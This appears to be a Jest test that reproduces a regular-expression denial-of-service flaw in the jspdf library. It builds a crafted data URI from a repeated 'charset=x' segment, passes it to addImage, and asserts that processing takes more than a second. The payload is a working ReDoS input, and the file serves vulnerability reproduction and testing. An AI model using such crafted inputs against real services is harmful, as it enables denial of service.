test("ReDos in jspdf", () => {
  const measureTime = require("../utils").measureTime;
  const { jsPDF } = require("jspdf");
  const doc = new jsPDF();
  doc.text("Hello world", 10, 10);
  let t = measureTime(function () {
    try {      
      doc.addImage("data:image/jpeg;" + "charset=x".repeat(25) + "!base64,", 'JPEG', 1, 2);
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
